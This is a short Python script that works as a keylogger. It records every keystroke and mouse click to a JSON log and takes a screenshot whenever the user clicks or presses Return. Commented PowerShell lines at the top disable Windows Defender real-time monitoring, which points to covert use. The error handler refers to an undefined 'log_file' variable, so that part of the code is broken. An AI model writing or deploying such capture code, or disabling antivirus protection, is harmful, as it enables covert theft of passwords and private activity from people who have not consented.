# import needed modules
#Set-MpPreference -DisableRealtimeMonitoring $true
#Set-MpPreference -DisableRealtimeMonitoring $false

import os
import pyautogui
from datetime import datetime
import pyxhookJson as pyxhook
import json

def main():
    log_path = f'{os.getcwd()}/{datetime.now().strftime("%Y-%m-%d_%H-%M")}/'
    os.mkdir(log_path, 0o777)
    # Specify the name of the file (can be changed)
    # The logging function with {event parm}
    def OnEvent(event):
        data = event.get()        
        with open(log_path+'activity.log', "a") as f:
            f.write('\n'+json.dumps(data))  # Write to the file
        if(data[1]==1 or data[4]=='Return'):
            im = pyautogui.screenshot()        
            im.save(log_path+str(data[0])+'.jpg')        
            #print(str(data[0]))

    # Create a hook manager object
    hm = pyxhook.HookManager()
    hm.HookKeyboard()  # set the hook
    hm.HookMouse()
    hm.KeyDown = OnEvent
    hm.MouseAllButtonsDown = OnEvent
    try: hm.start()  # start the hook    
    except Exception as ex:
        if(hm): hm.cancel()
        # Write exceptions to the log file, for analysis later.
        msg = f"Error while catching events:\n  {ex}"
        pyxhook.print_err(msg)
        with open(log_file, "a") as f: f.write(f"\n{msg}")


if __name__ == "__main__":
    main() 
